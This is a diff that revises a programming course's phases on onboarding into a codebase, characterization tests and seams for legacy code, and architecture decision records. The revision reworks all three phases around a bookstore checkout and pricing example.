+Production symptoms are data. Reproduce locally with the same seed if you can. Read the last few commits and open incidents on that path. Ask who owns the wallet service — a CODEOWNERS hit or a Slack channel is a signal, not bureaucracy. Phase 80’s observability habits help: a structured log on checkout failure is often a better first PR than a speculative rewrite of pricing.
+
+**YOUR ONE-PAGE ONBOARDING MAP:**
+
+Fill this while reading — not after you “feel ready.” The map is the deliverable of week one; the tiny PR is the proof.
 
 ```python playground=cs-phase-92-onboard-map
 # Toy "codebase map" you fill while reading a real repo.
+# Replace entries with what you actually find in Quarry Bookstore (or any OSS app).
 
 map_ = {
-    "how_to_run": ["docker compose up", "npm test"],
-    "entry_points": ["POST /checkout", "worker: emails"],
-    "slice": [
+    "how_to_run": ["docker compose up", "npm test", "seed: gift card + cart"],
+    "entry_points": ["POST /checkout", "GET /wallet/balance", "worker: emails"],
+    "slice_balance_bug": [
         "route → CheckoutController",
-        "→ PricingService",
-        "→ OrdersRepo.insert",
-        "→ enqueue EmailJob",
+        "→ WalletBalance.read_for_cart",
+        "→ GiftCardRepo",
+        "→ CheckoutSummaryDTO",
     ],
-    "first_safe_change": "add structured log on checkout failure",
+    "ownership_signals": ["CODEOWNERS: /wallet", "ADR-004 payments", "PR #1842"],
+    "hypothesis": "summary keeps first-attempt balance; retry skips refresh",
+    "first_safe_change": "refresh balance before summary on retry + log attempt_id",
 }
 
 for k, v in map_.items():
@@ -19873,15 +15465,31 @@ for k, v in map_.items():
         print(" ", v)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**WHAT “SMALL” MEANS:**
+
+A first PR teaches the pipeline, the reviewers’ expectations, and whether your mental map was wrong. A 400-line “cleanup” teaches fear. Prefer: add a characterization-friendly log line, fix the one null the ticket names, or add a regression test once you understand the path. Phase 72 already taught reviewable diffs — use that muscle here. Architecture cleanup and “proper” seams come after you can find the door (Phase 93).
+
+**COMMON ONBOARDING FAILURES:**
+
+| Failure | What goes wrong |
+| ------- | --------------- |
+| Folder tourism | You rename and rearrange without a running happy path |
+| Big-bang rewrite | You invent a second system while checkout still serves customers |
+| Silent drive-by | You “fix style” in files unrelated to the ticket |
+| No hypothesis | You edit until symptoms move, then cannot explain why |
+| No verify | You ship without reproducing the bug or the fix |
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
-| Easy | List the five onboarding steps from memory |
-| Medium | Map one open-source web app from route to database write |
-| Hard | Submit a real small PR to an unfamiliar repo and write what surprised you |
+| Easy | List the first-week loop steps from memory; mark which step your last project skipped |
+| Medium | Map one open-source web app from one route to one database write; one page, one slice |
+| Hard | Submit a real small PR to an unfamiliar repo — or a local Quarry-style checkout fix — and write three sentences on what the review taught you |
 
-**WHY THE NEXT TOPIC IS NEEDED - Legacy Code:** Sometimes the codebase has almost no tests and every change feels dangerous. You need techniques to **characterize** behavior and introduce **seams** before you change logic. That is Phase 93.
+**WHAT THIS UNLOCKS NEXT:**
+
+You can run the bookstore service, name the checkout front door, and ship a tiny fix with a written hypothesis. That still fails when the scary file — say `legacy_pricing.py` — has **almost no tests**, and every edit feels like a production bet. You need techniques to **characterize** what the code does today and introduce **seams** before you change logic. That is Phase 93.
 
 ---
 
@@ -19889,74 +15497,101 @@ for k, v in map_.items():
 
 ---
 
-
-
 # PHASE 93 - Legacy Code & Maintenance
 
 **Track:** Maintaining Real Software
 
-**WHAT YOU WILL BE ABLE TO DO:** Add a test seam and characterization tests around legacy behavior so you can change code safely when the original authors and tests are gone.
+**WHAT YOU WILL BE ABLE TO DO:** Add characterization tests and a test seam around legacy behavior so you can change code safely when the original authors and tests are gone — and judge refactor vs rewrite without turning debt into a moral panic.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 92 (you can navigate the system), Phase 74 (you already know a test pyramid - here the first tests often pin *current* behavior, not ideal behavior), Phase 75 (seams are often dependency boundaries).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 92 — you can navigate the system. Phase 74 — you already know a test pyramid; here the first tests often pin *current* behavior, not ideal behavior. Phase 75 — seams are often dependency boundaries.
+
+**LEARNING RESOURCES:**
+
+- [Seams: How to Test Legacy Code (Michael Feathers)](https://www.youtube.com/watch?v=j4VkzzYM4k4)
+- [Characterization Test (Martin Fowler bliki)](https://martinfowler.com/bliki/CharacterizationTest.html)
+- [emilybache/GildedRose-Refactoring-Kata](https://github.com/emilybache/GildedRose-Refactoring-Kata) — pin behavior, then refactor
+- [Working Effectively with Legacy Code themes (Tech Lead Journal)](https://www.youtube.com/watch?v=mwVRHDD0tEk)
 
 ## 93.1 Change Safely When Tests Are Missing
 
-**WHY YOU ARE LEARNING THIS:** Michael Feathers' practical definition: **legacy code is code without tests**. Without a safety net, "quick fixes" accumulate fear and accidental breakage. Characterization tests document what the system *does today* so refactoring has a tripwire. Seams are places you can alter behavior without editing every call site - for injection, fakes, or temporary test hooks.
+Phase 92 got you into the bookstore checkout path with a map and a small merge. The next ticket is nastier: **discount stacking** in `legacy_pricing` looks wrong for multi-item carts, and there is no meaningful test suite around it. The author left two years ago. Teammates say “don’t touch pricing.” Fear is rational — without a safety net, “quick fixes” accumulate accidental breakage. Michael Feathers’ practical definition still holds: **legacy code is code without tests**. This phase is not a second testing-pyramid course (that was Phase 74) and not a full architecture redesign (Phase 75). It is the **maintenance move**: characterize → seam → smallest change → verify — then decide whether to refactor behind green lights or leave well enough alone.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**CHARACTERIZATION FIRST:**
 
-- Feathers lens: [Seams: How to Test Legacy Code (Michael Feathers)](https://www.youtube.com/watch?v=j4VkzzYM4k4) *(Composio YouTube)*; [Working Effectively with Legacy Code themes (Tech Lead Journal)](https://www.youtube.com/watch?v=mwVRHDD0tEk) *(Composio YouTube)*
-- Characterization tests: [Characterization Test (Martin Fowler bliki)](https://martinfowler.com/bliki/CharacterizationTest.html) *(Composio fetch)*
-- Kata: [emilybache/GildedRose-Refactoring-Kata](https://github.com/emilybache/GildedRose-Refactoring-Kata) *(Composio GitHub)* - pin behavior, then refactor
-
-**STEP-BY-STEP EXPLANATION**
-
-| Move | Purpose |
-| ---- | ------- |
-| **Characterization test** | Lock current outputs for known inputs (including weird edge cases) |
-| **Seam** | Boundary where you can substitute a collaborator (interface, function param, subclass, link seam) |
-| **Sprout / wrap** | Add new code beside old (sprout method/class) or wrap old calls instead of editing the ball of mud first |
-| **Only then refactor** | Rename, extract, simplify behind the green tests |
+A characterization test locks **what the system does today** for known inputs — including weird edge cases — before you decide what it *should* do. You are not blessing bad behavior forever; you are installing a tripwire so a rename or extract cannot silently change totals. When intent becomes clear, replace pure characterization with intentional behavior tests. Until then, green means “still the same strange world.”
 
 ```text
-1) Capture:  assert legacy_fn(input) == <whatever it returns today>
-2) Seam:     pass db/clock/http as parameters (or wrap static calls)
-3) Change:   implement the fix / feature
-4) Tighten:  replace pure characterization with intentional behavior tests when you understand intent
+1) Capture:  assert legacy_price(cart) == <whatever it returns today>
+2) Seam:     pass clock / tax table / catalog as parameters (or wrap statics)
+3) Change:   implement the fix behind the tripwire
+4) Tighten:  replace pure characterization with intentional tests when intent is clear
 ```
 
-**SMALL WORKING EXAMPLE**
+**SEAMS, SPROUT, WRAP:**
+
+A **seam** is a place you can alter behavior without editing every call site — inject a collaborator, pass a function parameter, subclass, or wrap a static call. **Sprout** means grow new code beside the old (new method/class) and call it from a narrow place. **Wrap** means put a thin layer around the ball of mud so callers talk to something testable. Only then refactor: rename, extract, simplify behind green tests. Phase 75’s dependency boundaries are the same idea with better vocabulary; here you may invent a temporary seam that is ugly but safe.
+
+**WORKED SLICE — BOOKSTORE LEGACY PRICING:**
 
 ```python playground=cs-phase-93-characterization
-# Legacy function with hidden global dependency — add a seam, then characterize.
+# Legacy pricing with a hidden global tax table — characterize, then seam.
 
-CLOCK = ["2020-01-01"]  # pretend global
+TAX = {"default": 0.10}  # pretend module-global config
 
-def legacy_greeting(name):
-    # "legacy": hard to test because of global clock
-    return f"{name} @ {CLOCK[0]}"
+def legacy_line_total(unit_price, qty):
+    # "legacy": hard to test because tax comes from a global
+    return round(unit_price * qty * (1 + TAX["default"]), 2)
 
-def greeting(name, today):
-    # sprouted seam: clock injected
-    return f"{name} @ {today}"
+def line_total(unit_price, qty, tax_rate):
+    # sprouted seam: tax injected
+    return round(unit_price * qty * (1 + tax_rate), 2)
 
-# Characterization of current behavior
-assert legacy_greeting("Ada") == "Ada @ 2020-01-01"
+# Characterization of current behavior (including the weird rounding you inherit)
+assert legacy_line_total(10.00, 3) == 33.0
 
-# Same behavior via seam (now testable without globals)
-assert greeting("Ada", today="2020-01-01") == "Ada @ 2020-01-01"
-print("characterization OK; seam ready for safer changes")
+# Same behavior via seam — now testable without mutating globals
+assert line_total(10.00, 3, tax_rate=0.10) == 33.0
+
+# After the seam exists, you can characterize edge cases deliberately
+cases = [(0, 1, 0.0), (19.99, 2, 43.98), (5.00, 0, 0.0)]
+for price, qty, expected in cases:
+    assert line_total(price, qty, tax_rate=0.10) == expected
+
+print("characterization OK; seam ready for safer discount-stacking changes")
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+In the real checkout module the “global” might be a static DB lookup, a file read, or `datetime.now()`. The move is the same: capture outputs, introduce a seam, then change discount stacking with the tripwire on.
+
+**REFACTOR VS REWRITE (JUDGMENT, NOT SLOGAN):**
+
+| Path | When it fits | Failure mode |
+| ---- | ------------ | ------------ |
+| **Refactor behind tests** | Behavior is mostly right; structure blocks the fix | Endless tidy with no product outcome |
+| **Sprout / strangler** | New behavior can live beside old; cut over gradually | Two systems forever if you never delete the old path |
+| **Rewrite** | Boundary is clear, characterization is hopeless, or compliance forces a clean break | Second system while checkout still serves customers |
+
+Rewrites feel virtuous and often destroy institutional knowledge. Prefer the smallest path that makes the next change safe. Technical debt is **managed risk** — interest you pay in fear and slow delivery — not a moral failing of the previous team. Pay down the debt that sits on the change you need; do not declare holy war on every ugly file.
+
+**COMPATIBILITY AND DEPRECATION (LIGHT DEPTH):**
+
+When you extract or replace a pricing helper that other services still call, honesty requires a **compatibility story**: keep the old signature for a release, mark it deprecated, log call sites, and migrate callers. Feature flags and dual-run (old vs new total compared in logs) are maintenance tools, not Phase 81 system design. Skip them and you “fixed” pricing by breaking the mobile client.
+
+**WHAT THIS PHASE IS NOT:**
+
+- Not re-teaching the test pyramid end-to-end (74) — you already know unit/integration/e2e roles; characterization is the *first* net when none exists.
+- Not a microservice redesign course (75 / 81–88) — seams here are surgical, not an excuse to invent seven new services for one discount bug.
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Define legacy code (Feathers) and characterization test in one line each |
-| Medium | Add characterization tests for one Gilded Rose rule before refactoring |
-| Hard | Introduce a seam in a static-heavy module and cover it with tests |
+| Medium | Add characterization tests for one Gilded Rose rule *before* refactoring; show the red/green you expected |
+| Hard | Introduce a seam in a static-heavy module (clock, config, or HTTP) and cover it; write three sentences on refactor vs rewrite for that module |
 
-**WHY THE NEXT TOPIC IS NEEDED - Engineering Communication:** Safe technical change still fails if the *decision* is invisible - future you will re-litigate the same debate. Design docs and ADRs record why a path was chosen. That is Phase 94.
+**WHAT THIS UNLOCKS NEXT:**
+
+You can change `legacy_pricing` without praying — characterize, seam, smallest fix, verify. Safe technical change still fails if the **decision** is invisible: six months from now the team will re-litigate “why did we extract a pricing port?” from Slack archaeology. Design docs and Architecture Decision Records leave a trail teammates can act on without a meeting. That is Phase 94.
 
 ---
 
@@ -19964,64 +15599,72 @@ print("characterization OK; seam ready for safer changes")
 
 ---
 
-
-
 # PHASE 94 - Engineering Communication
 
 **Track:** Maintaining Real Software
 
-**WHAT YOU WILL BE ABLE TO DO:** Write a design doc or Architecture Decision Record (ADR) for a real decision - context, options, choice, and consequences - that a teammate can act on without a meeting.
+**WHAT YOU WILL BE ABLE TO DO:** Write a short Architecture Decision Record (ADR) or design note for a real maintenance decision — context, options, choice, and consequences — that a teammate can act on without a meeting.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 73 (requirements force clarity of *what*), Phase 75-76 (architecture and process force clarity of *how we work*), Phase 92-93 (you now change systems others built - leave a trail).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 73 — requirements clarify *what* to build. Phases 75–76 — architecture and process clarify *how we work*. Phases 92–93 — you now change systems others built; leave a trail.
+
+**LEARNING RESOURCES:**
+
+- [Documenting Architecture Decisions (Michael Nygard)](https://cognitect.com/blog/2011/11/15/documenting-architecture-decisions)
+- [adr.github.io](https://adr.github.io/)
+- [Architecture Decision Records (CodeOpinion)](https://www.youtube.com/watch?v=6H6zfCNeqek)
+- [adr/madr](https://github.com/adr/madr) — a practical template family
+- [joelparkerhenderson/architecture-decision-record](https://github.com/joelparkerhenderson/architecture-decision-record)
 
 ## 94.1 Explain Decisions, Not Just Code
 
-**WHY YOU ARE LEARNING THIS:** Code shows *what* shipped. It rarely shows *why alternatives lost*. ADRs and design docs are how teams stay fast without re-deriving every choice from Slack archaeology. Good ones are short, dated, and honest about trade-offs.
+Phases 92–93 made you able to onboard into Quarry Bookstore checkout and change legacy pricing behind characterization tests. The next pressure is organizational, not mechanical: the team wants to **extract a pricing port** so web checkout and a new mobile BFF stop duplicating discount rules. The code change is doable. What usually dies is the *why* — which option lost, what staleness or coupling you accepted, what you will not do yet. Code shows what shipped. It rarely shows why alternatives lost. ADRs and short design docs are how teams stay fast without re-deriving every crossroads from chat history.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+This is not Phase 73’s requirements rewrite (you are not restating the whole product) and not Phase 81’s system-design interview walkthrough (you are not estimating RPS for a URL shortener). It is **engineering communication for maintenance**: durable, dated, honest about trade-offs, short enough that people read it.
 
-- ADR idea: [Architecture Decision Records (CodeOpinion)](https://www.youtube.com/watch?v=6H6zfCNeqek) *(Composio YouTube)*; [Architectural Decision Records (Go Cloud Architects)](https://www.youtube.com/watch?v=GhB7vz3sg-0) *(Composio YouTube)*
-- Canonical: [Documenting Architecture Decisions (Michael Nygard)](https://cognitect.com/blog/2011/11/15/documenting-architecture-decisions) *(Composio fetch)*; [adr.github.io](https://adr.github.io/) *(Composio fetch)*
-- Templates: [adr/madr](https://github.com/adr/madr) *(Composio GitHub)*; [joelparkerhenderson/architecture-decision-record](https://github.com/joelparkerhenderson/architecture-decision-record) *(Composio GitHub)*
+**NYGARD-STYLE ADR (MINIMUM VIABLE):**
 
-**STEP-BY-STEP EXPLANATION**
+1. **Title** — short name of the decision  
+2. **Status** — proposed / accepted / deprecated / superseded  
+3. **Context** — forces that make a decision necessary *now*  
+4. **Decision** — what we will do  
+5. **Consequences** — good, bad, and neutral follow-ons  
 
-**Nygard-style ADR (minimum viable):**
-
-1. **Title** - short name of the decision  
-2. **Status** - proposed / accepted / deprecated / superseded  
-3. **Context** - forces that make a decision necessary  
-4. **Decision** - what we will do  
-5. **Consequences** - good, bad, neutral follow-ons  
-
-A longer **design doc** adds goals/non-goals, detailed design, rollout, risks, and alternatives considered - use it for larger bets; use ADRs for durable crossroads.
+A longer **design doc** adds goals/non-goals, detailed design, rollout, risks, and alternatives — use it for larger bets. Use ADRs for durable crossroads (“we will extract a pricing port”; “we will not rewrite checkout this quarter”). Good ones fit on one page. Bad ones are novels nobody updates, or slogans with no rejected options.
 
 ```text
-Context:   checkout p95 too high; DB CPU saturated
-Options:   (A) more read replicas  (B) cache prices  (C) rewrite service
-Decision:  B — cache-aside for price catalog, TTL 60s
-Consequences: faster reads; risk of stale prices → invalidate on admin write
+Context:   web checkout and mobile BFF duplicate discount rules;
+           Phase 93 characterization shows drift on multi-item carts
+Options:   (A) keep duplicating + sync by hand
+           (B) extract PricingPort; both callers use one module
+           (C) full rewrite of checkout + pricing as a new service
+Decision:  B — extract in-process port first; no new network hop yet
+Consequences: + one rule source; - migration of two call sites;
+              - must deprecate old helpers; NOT solving multi-region yet
 ```
 
-**SMALL WORKING EXAMPLE**
+**WORKED SCAFFOLD — PRICING PORT ADR:**
 
 ```python playground=cs-phase-94-adr-scaffold
 # Fill this scaffold; the point is the structure, not fancy formatting.
 
 adr = {
-    "title": "ADR-001: Cache product prices in Redis",
+    "title": "ADR-014: Extract in-process PricingPort for checkout",
     "status": "accepted",
-    "context": "Checkout p95 > 800ms; price reads dominate DB CPU",
+    "context": (
+        "Web checkout and mobile BFF diverge on multi-item discounts; "
+        "legacy_pricing characterized in Phase 93; duplicate fixes shipping twice"
+    ),
     "options": [
-        "A: vertical scale DB",
-        "B: cache-aside Redis TTL 60s + invalidate on admin write",
-        "C: rewrite pricing service",
+        "A: keep two copies; document the formula in the wiki",
+        "B: extract PricingPort module; both callers depend on it",
+        "C: rewrite pricing as a standalone microservice now",
     ],
     "decision": "B",
     "consequences": [
-        "+ lower DB load",
-        "- possible 60s staleness",
-        "- new dependency/ops surface",
+        "+ single source of discount truth for current clients",
+        "- migrate two call sites; deprecate legacy helpers for one release",
+        "- new module ownership in CODEOWNERS",
+        "neutral: microservice split deferred until a second bounded context appears",
     ],
 }
 
@@ -20032,22 +15675,37 @@ for c in adr["consequences"]:
     print(" ", c)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**STATUS OVER TIME:**
+
+ADRs are living records. When a later choice replaces this one, mark the old ADR **superseded**, link the new ID, and say what changed — e.g. “PricingPort moves to its own service after mobile traffic forces an independent deploy.” Deprecation without a link is how archaeology starts again.
+
+**DESIGN DOC VS ADR (PICK THE LIGHTWEIGHT TOOL):**
+
+| Artifact | Best for | Smell of misuse |
+| -------- | -------- | --------------- |
+| **ADR** | One crossroads; options + consequences | Writing an ADR for every rename |
+| **Design doc** | Multi-week bet; rollout and risks | Using a design doc to avoid a decision |
+| **PR description** | What *this* diff does | Hiding architecture choice only in a PR |
+
+Phase 92’s ownership signals should point at these files. Future onboarders (including you) will thank the trail.
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | List the five Nygard ADR fields from memory |
-| Medium | Write an ADR for a real choice in one of your projects (even a student project) |
-| Hard | Supersede an old ADR: mark status, link the new one, explain what changed |
+| Medium | Write an ADR for extracting PricingPort (or a real choice in one of your projects) — include one rejected option with why |
+| Hard | Supersede an old ADR: mark status, link the new one, explain what force changed |
 
-**WHY THE NEXT TOPIC IS NEEDED - Grand Capstone:** Reading, sealing, and documenting existing systems prepares you to *own* an end-to-end build. Story XIV starts with scoping a honestly buildable capstone at Phase 95.
+**WHAT THIS UNLOCKS NEXT:**
+
+Story XIII made you able to **maintain real software**: onboard with a map and a tiny fix (92), change legacy behavior behind characterization and seams (93), and leave a durable decision record (94). You can join a production team without rewriting the world — and without losing the *why*. That maintenance fluency is exactly what you need before you **own an end-to-end build** of your own. Story XIV’s Grand Capstone starts at Phase 95 with an honestly scoped MVP: musts, non-goals, architecture sketch, and a trade-off log *before* you implement production features. Building, hardening, and portfolio packaging are 96–98 — do not start coding the dream yet; start by scoping what you can finish.
 
 ---
 
 > **Phase 94 complete?** [Continue to Phase 95](#phase-95)
 
 ---
-
 
 # PHASE 95 - Capstone Planning
 
